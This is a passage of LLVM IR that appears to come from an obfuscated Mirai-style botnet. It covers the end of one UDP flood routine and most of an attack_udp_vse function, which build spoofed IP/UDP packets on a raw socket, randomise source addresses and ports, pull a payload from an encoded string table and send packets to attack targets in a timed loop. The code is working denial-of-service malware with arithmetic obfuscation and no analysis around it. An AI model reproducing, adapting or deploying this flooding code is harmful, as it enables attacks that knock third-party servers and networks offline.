  %104 = load i32, i32* %11, align 4
  %105 = sext i32 %104 to i64
  %106 = getelementptr inbounds i8*, i8** %103, i64 %105
  store i8* %102, i8** %106, align 8
  %107 = load i8**, i8*** %13, align 8
  %108 = load i32, i32* %11, align 4
  %109 = sext i32 %108 to i64
  %110 = getelementptr inbounds i8*, i8** %107, i64 %109
  %111 = load i8*, i8** %110, align 8
  %112 = bitcast i8* %111 to %struct.iphdr*
  store %struct.iphdr* %112, %struct.iphdr** %24, align 8
  %113 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %114 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %113, i64 1
  %115 = bitcast %struct.iphdr* %114 to %struct.udphdr*
  store %struct.udphdr* %115, %struct.udphdr** %25, align 8
  %116 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %117 = bitcast %struct.iphdr* %116 to i8*
  %118 = load i8, i8* %117, align 4
  %119 = xor i8 15, -1
  %120 = xor i8 %118, %119
  %121 = and i8 %120, %118
  %122 = and i8 %118, 15
  %123 = and i8 %121, 64
  %124 = xor i8 %121, 64
  %125 = or i8 %123, %124
  %126 = or i8 %121, 64
  store i8 %125, i8* %117, align 4
  %127 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %128 = bitcast %struct.iphdr* %127 to i8*
  %129 = load i8, i8* %128, align 4
  %130 = xor i8 -16, -1
  %131 = xor i8 %129, %130
  %132 = and i8 %131, %129
  %133 = and i8 %129, -16
  %134 = and i8 %132, 5
  %135 = xor i8 %132, 5
  %136 = or i8 %134, %135
  %137 = or i8 %132, 5
  store i8 %136, i8* %128, align 4
  %138 = load i8, i8* %14, align 1
  %139 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %140 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %139, i32 0, i32 1
  store i8 %138, i8* %140, align 1
  %141 = load i16, i16* %20, align 2
  %142 = zext i16 %141 to i64
  %143 = sub i64 0, %142
  %144 = sub i64 28, %143
  %145 = add i64 28, %142
  %146 = trunc i64 %144 to i16
  %147 = call zeroext i16 @htons(i16 zeroext %146) #7
  %148 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %149 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %148, i32 0, i32 2
  store i16 %147, i16* %149, align 2
  %150 = load i16, i16* %15, align 2
  %151 = call zeroext i16 @htons(i16 zeroext %150) #7
  %152 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %153 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %152, i32 0, i32 3
  store i16 %151, i16* %153, align 4
  %154 = load i8, i8* %16, align 1
  %155 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %156 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %155, i32 0, i32 5
  store i8 %154, i8* %156, align 4
  %157 = load i8, i8* %17, align 1
  %158 = icmp ne i8 %157, 0
  br i1 %158, label %159, label %163

; <label>:159:                                    ; preds = %101
  %160 = call zeroext i16 @htons(i16 zeroext 16384) #7
  %161 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %162 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %161, i32 0, i32 4
  store i16 %160, i16* %162, align 2
  br label %163

; <label>:163:                                    ; preds = %159, %101
  %164 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %165 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %164, i32 0, i32 6
  store i8 17, i8* %165, align 1
  %166 = load i32, i32* %22, align 4
  %167 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %168 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %167, i32 0, i32 8
  store i32 %166, i32* %168, align 4
  %169 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %170 = load i32, i32* %11, align 4
  %171 = sext i32 %170 to i64
  %172 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %169, i64 %171
  %173 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %172, i32 0, i32 1
  %174 = load i32, i32* %173, align 4
  %175 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %176 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %175, i32 0, i32 9
  store i32 %174, i32* %176, align 4
  %177 = load i16, i16* %18, align 2
  %178 = call zeroext i16 @htons(i16 zeroext %177) #7
  %179 = load %struct.udphdr*, %struct.udphdr** %25, align 8
  %180 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %179, i32 0, i32 0
  store i16 %178, i16* %180, align 2
  %181 = load i16, i16* %19, align 2
  %182 = call zeroext i16 @htons(i16 zeroext %181) #7
  %183 = load %struct.udphdr*, %struct.udphdr** %25, align 8
  %184 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %183, i32 0, i32 1
  store i16 %182, i16* %184, align 2
  %185 = load i16, i16* %20, align 2
  %186 = zext i16 %185 to i64
  %187 = sub i64 0, 8
  %188 = sub i64 0, %186
  %189 = add i64 %187, %188
  %190 = sub i64 0, %189
  %191 = add i64 8, %186
  %192 = trunc i64 %190 to i16
  %193 = call zeroext i16 @htons(i16 zeroext %192) #7
  %194 = load %struct.udphdr*, %struct.udphdr** %25, align 8
  %195 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %194, i32 0, i32 2
  store i16 %193, i16* %195, align 2
  br label %196

; <label>:196:                                    ; preds = %163
  %197 = load i32, i32* %11, align 4
  %198 = sub i32 0, 1
  %199 = sub i32 %197, %198
  %200 = add nsw i32 %197, 1
  store i32 %199, i32* %11, align 4
  br label %96

; <label>:201:                                    ; preds = %96
  br label %202

; <label>:202:                                    ; preds = %363, %201
  store i32 0, i32* %11, align 4
  br label %203

; <label>:203:                                    ; preds = %351, %202
  %204 = load i32, i32* %11, align 4
  %205 = load i8, i8* %7, align 1
  %206 = zext i8 %205 to i32
  %207 = icmp slt i32 %204, %206
  br i1 %207, label %208, label %357

; <label>:208:                                    ; preds = %203
  %209 = load i8**, i8*** %13, align 8
  %210 = load i32, i32* %11, align 4
  %211 = sext i32 %210 to i64
  %212 = getelementptr inbounds i8*, i8** %209, i64 %211
  %213 = load i8*, i8** %212, align 8
  store i8* %213, i8** %26, align 8
  %214 = load i8*, i8** %26, align 8
  %215 = bitcast i8* %214 to %struct.iphdr*
  store %struct.iphdr* %215, %struct.iphdr** %27, align 8
  %216 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %217 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %216, i64 1
  %218 = bitcast %struct.iphdr* %217 to %struct.udphdr*
  store %struct.udphdr* %218, %struct.udphdr** %28, align 8
  %219 = load %struct.udphdr*, %struct.udphdr** %28, align 8
  %220 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %219, i64 1
  %221 = bitcast %struct.udphdr* %220 to i8*
  store i8* %221, i8** %29, align 8
  %222 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %223 = load i32, i32* %11, align 4
  %224 = sext i32 %223 to i64
  %225 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %222, i64 %224
  %226 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %225, i32 0, i32 2
  %227 = load i8, i8* %226, align 4
  %228 = zext i8 %227 to i32
  %229 = icmp slt i32 %228, 32
  br i1 %229, label %230, label %253

; <label>:230:                                    ; preds = %208
  %231 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %232 = load i32, i32* %11, align 4
  %233 = sext i32 %232 to i64
  %234 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %231, i64 %233
  %235 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %234, i32 0, i32 1
  %236 = load i32, i32* %235, align 4
  %237 = call i32 @ntohl(i32 %236) #7
  %238 = call i32 @rand_next()
  %239 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %240 = load i32, i32* %11, align 4
  %241 = sext i32 %240 to i64
  %242 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %239, i64 %241
  %243 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %242, i32 0, i32 2
  %244 = load i8, i8* %243, align 4
  %245 = zext i8 %244 to i32
  %246 = lshr i32 %238, %245
  %247 = sub i32 0, %246
  %248 = sub i32 %237, %247
  %249 = add i32 %237, %246
  %250 = call i32 @htonl(i32 %248) #7
  %251 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %252 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %251, i32 0, i32 9
  store i32 %250, i32* %252, align 4
  br label %253

; <label>:253:                                    ; preds = %230, %208
  %254 = load i32, i32* %22, align 4
  %255 = icmp eq i32 %254, -1
  br i1 %255, label %256, label %260

; <label>:256:                                    ; preds = %253
  %257 = call i32 @rand_next()
  %258 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %259 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %258, i32 0, i32 8
  store i32 %257, i32* %259, align 4
  br label %260

; <label>:260:                                    ; preds = %256, %253
  %261 = load i16, i16* %15, align 2
  %262 = zext i16 %261 to i32
  %263 = icmp eq i32 %262, 65535
  br i1 %263, label %264, label %269

; <label>:264:                                    ; preds = %260
  %265 = call i32 @rand_next()
  %266 = trunc i32 %265 to i16
  %267 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %268 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %267, i32 0, i32 3
  store i16 %266, i16* %268, align 4
  br label %269

; <label>:269:                                    ; preds = %264, %260
  %270 = load i16, i16* %18, align 2
  %271 = zext i16 %270 to i32
  %272 = icmp eq i32 %271, 65535
  br i1 %272, label %273, label %278

; <label>:273:                                    ; preds = %269
  %274 = call i32 @rand_next()
  %275 = trunc i32 %274 to i16
  %276 = load %struct.udphdr*, %struct.udphdr** %28, align 8
  %277 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %276, i32 0, i32 0
  store i16 %275, i16* %277, align 2
  br label %278

; <label>:278:                                    ; preds = %273, %269
  %279 = load i16, i16* %19, align 2
  %280 = zext i16 %279 to i32
  %281 = icmp eq i32 %280, 65535
  br i1 %281, label %282, label %287

; <label>:282:                                    ; preds = %278
  %283 = call i32 @rand_next()
  %284 = trunc i32 %283 to i16
  %285 = load %struct.udphdr*, %struct.udphdr** %28, align 8
  %286 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %285, i32 0, i32 1
  store i16 %284, i16* %286, align 2
  br label %287

; <label>:287:                                    ; preds = %282, %278
  %288 = load i8, i8* %21, align 1
  %289 = icmp ne i8 %288, 0
  br i1 %289, label %290, label %298

; <label>:290:                                    ; preds = %287
  %291 = load i8*, i8** %29, align 8
  %292 = load i16, i16* %20, align 2
  %293 = zext i16 %292 to i32
  call void @rand_alphastr(i8* %291, i32 %293)
  %294 = load i8*, i8** %29, align 8
  %295 = load i16, i16* %20, align 2
  %296 = zext i16 %295 to i64
  %297 = getelementptr inbounds i8, i8* %294, i64 %296
  store i8 0, i8* %297, align 1
  br label %298

; <label>:298:                                    ; preds = %290, %287
  %299 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %300 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %299, i32 0, i32 7
  store i16 0, i16* %300, align 2
  %301 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %302 = bitcast %struct.iphdr* %301 to i16*
  %303 = call zeroext i16 @checksum_generic(i16* %302, i32 20)
  %304 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %305 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %304, i32 0, i32 7
  store i16 %303, i16* %305, align 2
  %306 = load %struct.udphdr*, %struct.udphdr** %28, align 8
  %307 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %306, i32 0, i32 3
  store i16 0, i16* %307, align 2
  %308 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %309 = load %struct.udphdr*, %struct.udphdr** %28, align 8
  %310 = bitcast %struct.udphdr* %309 to i8*
  %311 = load %struct.udphdr*, %struct.udphdr** %28, align 8
  %312 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %311, i32 0, i32 2
  %313 = load i16, i16* %312, align 2
  %314 = load i16, i16* %20, align 2
  %315 = zext i16 %314 to i64
  %316 = sub i64 0, 8
  %317 = sub i64 0, %315
  %318 = add i64 %316, %317
  %319 = sub i64 0, %318
  %320 = add i64 8, %315
  %321 = trunc i64 %319 to i32
  %322 = call zeroext i16 @checksum_tcpudp(%struct.iphdr* %308, i8* %310, i16 zeroext %313, i32 %321)
  %323 = load %struct.udphdr*, %struct.udphdr** %28, align 8
  %324 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %323, i32 0, i32 3
  store i16 %322, i16* %324, align 2
  %325 = load %struct.udphdr*, %struct.udphdr** %28, align 8
  %326 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %325, i32 0, i32 1
  %327 = load i16, i16* %326, align 2
  %328 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %329 = load i32, i32* %11, align 4
  %330 = sext i32 %329 to i64
  %331 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %328, i64 %330
  %332 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %331, i32 0, i32 0
  %333 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %332, i32 0, i32 1
  store i16 %327, i16* %333, align 2
  %334 = load i32, i32* %12, align 4
  %335 = load i8*, i8** %26, align 8
  %336 = load i16, i16* %20, align 2
  %337 = zext i16 %336 to i64
  %338 = sub i64 0, %337
  %339 = sub i64 28, %338
  %340 = add i64 28, %337
  %341 = bitcast %union.__CONST_SOCKADDR_ARG* %30 to %struct.sockaddr**
  %342 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %343 = load i32, i32* %11, align 4
  %344 = sext i32 %343 to i64
  %345 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %342, i64 %344
  %346 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %345, i32 0, i32 0
  %347 = bitcast %struct.sockaddr_in* %346 to %struct.sockaddr*
  store %struct.sockaddr* %347, %struct.sockaddr** %341, align 8
  %348 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %30, i32 0, i32 0
  %349 = load %struct.sockaddr*, %struct.sockaddr** %348, align 8
  %350 = call i64 @sendto(i32 %334, i8* %335, i64 %339, i32 16384, %struct.sockaddr* %349, i32 16)
  br label %351

; <label>:351:                                    ; preds = %298
  %352 = load i32, i32* %11, align 4
  %353 = sub i32 %352, 1080254261
  %354 = add i32 %353, 1
  %355 = add i32 %354, 1080254261
  %356 = add nsw i32 %352, 1
  store i32 %355, i32* %11, align 4
  br label %203

; <label>:357:                                    ; preds = %203
  %358 = call i64 @time(i64* null) #6
  %359 = load i32, i32* %23, align 4
  %360 = sext i32 %359 to i64
  %361 = icmp sgt i64 %358, %360
  br i1 %361, label %362, label %363

; <label>:362:                                    ; preds = %357
  br label %364

; <label>:363:                                    ; preds = %357
  br label %202

; <label>:364:                                    ; preds = %362, %92, %86
  ret void
}

; Function Attrs: noinline nounwind uwtable
define void @attack_udp_vse(i32, i8 zeroext, %struct.attack_target*, i8 zeroext, %struct.attack_option*) #0 {
  %6 = alloca i32, align 4
  %7 = alloca i8, align 1
  %8 = alloca %struct.attack_target*, align 8
  %9 = alloca i8, align 1
  %10 = alloca %struct.attack_option*, align 8
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca i8**, align 8
  %14 = alloca i8, align 1
  %15 = alloca i16, align 2
  %16 = alloca i8, align 1
  %17 = alloca i8, align 1
  %18 = alloca i16, align 2
  %19 = alloca i16, align 2
  %20 = alloca i8*, align 8
  %21 = alloca i32, align 4
  %22 = alloca i32, align 4
  %23 = alloca %struct.iphdr*, align 8
  %24 = alloca %struct.udphdr*, align 8
  %25 = alloca i8*, align 8
  %26 = alloca i8*, align 8
  %27 = alloca %struct.iphdr*, align 8
  %28 = alloca %struct.udphdr*, align 8
  %29 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  store i32 %0, i32* %6, align 4
  store i8 %1, i8* %7, align 1
  store %struct.attack_target* %2, %struct.attack_target** %8, align 8
  store i8 %3, i8* %9, align 1
  store %struct.attack_option* %4, %struct.attack_option** %10, align 8
  store i32 0, i32* %11, align 4
  store i32 0, i32* %12, align 4
  %30 = load i8, i8* %7, align 1
  %31 = zext i8 %30 to i64
  %32 = call noalias i8* @calloc(i64 %31, i64 8) #6
  %33 = bitcast i8* %32 to i8**
  store i8** %33, i8*** %13, align 8
  %34 = load i8, i8* %9, align 1
  %35 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %36 = call i32 @attack_get_opt_int(i8 zeroext %34, %struct.attack_option* %35, i8 zeroext 2, i32 0)
  %37 = trunc i32 %36 to i8
  store i8 %37, i8* %14, align 1
  %38 = load i8, i8* %9, align 1
  %39 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %40 = call i32 @attack_get_opt_int(i8 zeroext %38, %struct.attack_option* %39, i8 zeroext 3, i32 65535)
  %41 = trunc i32 %40 to i16
  store i16 %41, i16* %15, align 2
  %42 = load i8, i8* %9, align 1
  %43 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %44 = call i32 @attack_get_opt_int(i8 zeroext %42, %struct.attack_option* %43, i8 zeroext 4, i32 64)
  %45 = trunc i32 %44 to i8
  store i8 %45, i8* %16, align 1
  %46 = load i8, i8* %9, align 1
  %47 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %48 = call i32 @attack_get_opt_int(i8 zeroext %46, %struct.attack_option* %47, i8 zeroext 5, i32 0)
  %49 = trunc i32 %48 to i8
  store i8 %49, i8* %17, align 1
  %50 = load i8, i8* %9, align 1
  %51 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %52 = call i32 @attack_get_opt_int(i8 zeroext %50, %struct.attack_option* %51, i8 zeroext 6, i32 65535)
  %53 = trunc i32 %52 to i16
  store i16 %53, i16* %18, align 2
  %54 = load i8, i8* %9, align 1
  %55 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %56 = call i32 @attack_get_opt_int(i8 zeroext %54, %struct.attack_option* %55, i8 zeroext 7, i32 27015)
  %57 = trunc i32 %56 to i16
  store i16 %57, i16* %19, align 2
  store i32 0, i32* %21, align 4
  %58 = call i64 @time(i64* null) #6
  %59 = load i32, i32* %6, align 4
  %60 = sext i32 %59 to i64
  %61 = sub i64 0, %58
  %62 = sub i64 0, %60
  %63 = add i64 %61, %62
  %64 = sub i64 0, %63
  %65 = add nsw i64 %58, %60
  %66 = trunc i64 %64 to i32
  store i32 %66, i32* %22, align 4
  call void @table_unlock_val(i8 zeroext 36)
  %67 = call i8* @table_retrieve_val(i32 36, i32* %21)
  store i8* %67, i8** %20, align 8
  %68 = call i32 @socket(i32 2, i32 3, i32 17) #6
  store i32 %68, i32* %12, align 4
  %69 = icmp eq i32 %68, -1
  br i1 %69, label %70, label %71

; <label>:70:                                     ; preds = %5
  br label %355

; <label>:71:                                     ; preds = %5
  store i32 1, i32* %11, align 4
  %72 = load i32, i32* %12, align 4
  %73 = bitcast i32* %11 to i8*
  %74 = call i32 @setsockopt(i32 %72, i32 0, i32 3, i8* %73, i32 4) #6
  %75 = icmp eq i32 %74, -1
  br i1 %75, label %76, label %79

; <label>:76:                                     ; preds = %71
  %77 = load i32, i32* %12, align 4
  %78 = call i32 @close(i32 %77)
  br label %355

; <label>:79:                                     ; preds = %71
  store i32 0, i32* %11, align 4
  br label %80

; <label>:80:                                     ; preds = %207, %79
  %81 = load i32, i32* %11, align 4
  %82 = load i8, i8* %7, align 1
  %83 = zext i8 %82 to i32
  %84 = icmp slt i32 %81, %83
  br i1 %84, label %85, label %212

; <label>:85:                                     ; preds = %80
  %86 = call noalias i8* @calloc(i64 128, i64 1) #6
  %87 = load i8**, i8*** %13, align 8
  %88 = load i32, i32* %11, align 4
  %89 = sext i32 %88 to i64
  %90 = getelementptr inbounds i8*, i8** %87, i64 %89
  store i8* %86, i8** %90, align 8
  %91 = load i8**, i8*** %13, align 8
  %92 = load i32, i32* %11, align 4
  %93 = sext i32 %92 to i64
  %94 = getelementptr inbounds i8*, i8** %91, i64 %93
  %95 = load i8*, i8** %94, align 8
  %96 = bitcast i8* %95 to %struct.iphdr*
  store %struct.iphdr* %96, %struct.iphdr** %23, align 8
  %97 = load %struct.iphdr*, %struct.iphdr** %23, align 8
  %98 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %97, i64 1
  %99 = bitcast %struct.iphdr* %98 to %struct.udphdr*
  store %struct.udphdr* %99, %struct.udphdr** %24, align 8
  %100 = load %struct.udphdr*, %struct.udphdr** %24, align 8
  %101 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %100, i64 1
  %102 = bitcast %struct.udphdr* %101 to i8*
  store i8* %102, i8** %25, align 8
  %103 = load %struct.iphdr*, %struct.iphdr** %23, align 8
  %104 = bitcast %struct.iphdr* %103 to i8*
  %105 = load i8, i8* %104, align 4
  %106 = xor i8 %105, -1
  %107 = xor i8 15, -1
  %108 = xor i8 -46, -1
  %109 = or i8 %106, %107
  %110 = or i8 -46, %108
  %111 = xor i8 %109, -1
  %112 = and i8 %111, %110
  %113 = and i8 %105, 15
  %114 = xor i8 %112, -1
  %115 = xor i8 64, -1
  %116 = xor i8 -100, -1
  %117 = and i8 %114, -100
  %118 = and i8 %112, %116
  %119 = and i8 %115, -100
  %120 = and i8 64, %116
  %121 = or i8 %117, %118
  %122 = or i8 %119, %120
  %123 = xor i8 %121, %122
  %124 = or i8 %114, %115
  %125 = xor i8 %124, -1
  %126 = or i8 -100, %116
  %127 = and i8 %125, %126
  %128 = or i8 %123, %127
  %129 = or i8 %112, 64
  store i8 %128, i8* %104, align 4
  %130 = load %struct.iphdr*, %struct.iphdr** %23, align 8
  %131 = bitcast %struct.iphdr* %130 to i8*
  %132 = load i8, i8* %131, align 4
  %133 = xor i8 -16, -1
  %134 = xor i8 %132, %133
  %135 = and i8 %134, %132
  %136 = and i8 %132, -16
  %137 = and i8 %135, 5
  %138 = xor i8 %135, 5
  %139 = or i8 %137, %138
  %140 = or i8 %135, 5
  store i8 %139, i8* %131, align 4
  %141 = load i8, i8* %14, align 1
  %142 = load %struct.iphdr*, %struct.iphdr** %23, align 8
  %143 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %142, i32 0, i32 1
  store i8 %141, i8* %143, align 1
  %144 = load i32, i32* %21, align 4
  %145 = sext i32 %144 to i64
  %146 = sub i64 32, -7829233537043785827
  %147 = add i64 %146, %145
  %148 = add i64 %147, -7829233537043785827
  %149 = add i64 32, %145
  %150 = trunc i64 %148 to i16
  %151 = call zeroext i16 @htons(i16 zeroext %150) #7
  %152 = load %struct.iphdr*, %struct.iphdr** %23, align 8
  %153 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %152, i32 0, i32 2
  store i16 %151, i16* %153, align 2
  %154 = load i16, i16* %15, align 2
  %155 = call zeroext i16 @htons(i16 zeroext %154) #7
  %156 = load %struct.iphdr*, %struct.iphdr** %23, align 8
  %157 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %156, i32 0, i32 3
  store i16 %155, i16* %157, align 4
  %158 = load i8, i8* %16, align 1
  %159 = load %struct.iphdr*, %struct.iphdr** %23, align 8
  %160 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %159, i32 0, i32 5
  store i8 %158, i8* %160, align 4
  %161 = load i8, i8* %17, align 1
  %162 = icmp ne i8 %161, 0
  br i1 %162, label %163, label %167

; <label>:163:                                    ; preds = %85
  %164 = call zeroext i16 @htons(i16 zeroext 16384) #7
  %165 = load %struct.iphdr*, %struct.iphdr** %23, align 8
  %166 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %165, i32 0, i32 4
  store i16 %164, i16* %166, align 2
  br label %167

; <label>:167:                                    ; preds = %163, %85
  %168 = load %struct.iphdr*, %struct.iphdr** %23, align 8
  %169 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %168, i32 0, i32 6
  store i8 17, i8* %169, align 1
  %170 = load i32, i32* @LOCAL_ADDR, align 4
  %171 = load %struct.iphdr*, %struct.iphdr** %23, align 8
  %172 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %171, i32 0, i32 8
  store i32 %170, i32* %172, align 4
  %173 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %174 = load i32, i32* %11, align 4
  %175 = sext i32 %174 to i64
  %176 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %173, i64 %175
  %177 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %176, i32 0, i32 1
  %178 = load i32, i32* %177, align 4
  %179 = load %struct.iphdr*, %struct.iphdr** %23, align 8
  %180 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %179, i32 0, i32 9
  store i32 %178, i32* %180, align 4
  %181 = load i16, i16* %18, align 2
  %182 = call zeroext i16 @htons(i16 zeroext %181) #7
  %183 = load %struct.udphdr*, %struct.udphdr** %24, align 8
  %184 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %183, i32 0, i32 0
  store i16 %182, i16* %184, align 2
  %185 = load i16, i16* %19, align 2
  %186 = call zeroext i16 @htons(i16 zeroext %185) #7
  %187 = load %struct.udphdr*, %struct.udphdr** %24, align 8
  %188 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %187, i32 0, i32 1
  store i16 %186, i16* %188, align 2
  %189 = load i32, i32* %21, align 4
  %190 = sext i32 %189 to i64
  %191 = sub i64 0, 12
  %192 = sub i64 0, %190
  %193 = add i64 %191, %192
  %194 = sub i64 0, %193
  %195 = add i64 12, %190
  %196 = trunc i64 %194 to i16
  %197 = call zeroext i16 @htons(i16 zeroext %196) #7
  %198 = load %struct.udphdr*, %struct.udphdr** %24, align 8
  %199 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %198, i32 0, i32 2
  store i16 %197, i16* %199, align 2
  %200 = load i8*, i8** %25, align 8
  %201 = bitcast i8* %200 to i32*
  store i32 -1, i32* %201, align 4
  %202 = load i8*, i8** %25, align 8
  %203 = getelementptr inbounds i8, i8* %202, i64 4
  store i8* %203, i8** %25, align 8
  %204 = load i8*, i8** %25, align 8
  %205 = load i8*, i8** %20, align 8
  %206 = load i32, i32* %21, align 4
  call void @util_memcpy(i8* %204, i8* %205, i32 %206)
  br label %207

; <label>:207:                                    ; preds = %167
  %208 = load i32, i32* %11, align 4
  %209 = sub i32 0, 1
  %210 = sub i32 %208, %209
  %211 = add nsw i32 %208, 1
  store i32 %210, i32* %11, align 4
  br label %80

; <label>:212:                                    ; preds = %80
  br label %213

; <label>:213:                                    ; preds = %354, %212
  store i32 0, i32* %11, align 4
  br label %214

; <label>:214:                                    ; preds = %341, %213
  %215 = load i32, i32* %11, align 4
  %216 = load i8, i8* %7, align 1
  %217 = zext i8 %216 to i32
  %218 = icmp slt i32 %215, %217
  br i1 %218, label %219, label %348

; <label>:219:                                    ; preds = %214
  %220 = load i8**, i8*** %13, align 8
  %221 = load i32, i32* %11, align 4
  %222 = sext i32 %221 to i64
  %223 = getelementptr inbounds i8*, i8** %220, i64 %222
  %224 = load i8*, i8** %223, align 8
  store i8* %224, i8** %26, align 8
  %225 = load i8*, i8** %26, align 8
  %226 = bitcast i8* %225 to %struct.iphdr*
  store %struct.iphdr* %226, %struct.iphdr** %27, align 8
  %227 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %228 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %227, i64 1
  %229 = bitcast %struct.iphdr* %228 to %struct.udphdr*
  store %struct.udphdr* %229, %struct.udphdr** %28, align 8
  %230 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %231 = load i32, i32* %11, align 4
  %232 = sext i32 %231 to i64
  %233 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %230, i64 %232
  %234 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %233, i32 0, i32 2
  %235 = load i8, i8* %234, align 4
  %236 = zext i8 %235 to i32
  %237 = icmp slt i32 %236, 32
  br i1 %237, label %238, label %262

; <label>:238:                                    ; preds = %219
  %239 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %240 = load i32, i32* %11, align 4
  %241 = sext i32 %240 to i64
  %242 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %239, i64 %241
  %243 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %242, i32 0, i32 1
  %244 = load i32, i32* %243, align 4
  %245 = call i32 @ntohl(i32 %244) #7
  %246 = call i32 @rand_next()
  %247 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %248 = load i32, i32* %11, align 4
  %249 = sext i32 %248 to i64
  %250 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %247, i64 %249
  %251 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %250, i32 0, i32 2
  %252 = load i8, i8* %251, align 4
  %253 = zext i8 %252 to i32
  %254 = lshr i32 %246, %253
  %255 = add i32 %245, -2042916070
  %256 = add i32 %255, %254
  %257 = sub i32 %256, -2042916070
  %258 = add i32 %245, %254
  %259 = call i32 @htonl(i32 %257) #7
  %260 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %261 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %260, i32 0, i32 9
  store i32 %259, i32* %261, align 4
  br label %262

; <label>:262:                                    ; preds = %238, %219
  %263 = load i16, i16* %15, align 2
  %264 = zext i16 %263 to i32
  %265 = icmp eq i32 %264, 65535
  br i1 %265, label %266, label %271

; <label>:266:                                    ; preds = %262
  %267 = call i32 @rand_next()
  %268 = trunc i32 %267 to i16
  %269 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %270 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %269, i32 0, i32 3
  store i16 %268, i16* %270, align 4
  br label %271

; <label>:271:                                    ; preds = %266, %262
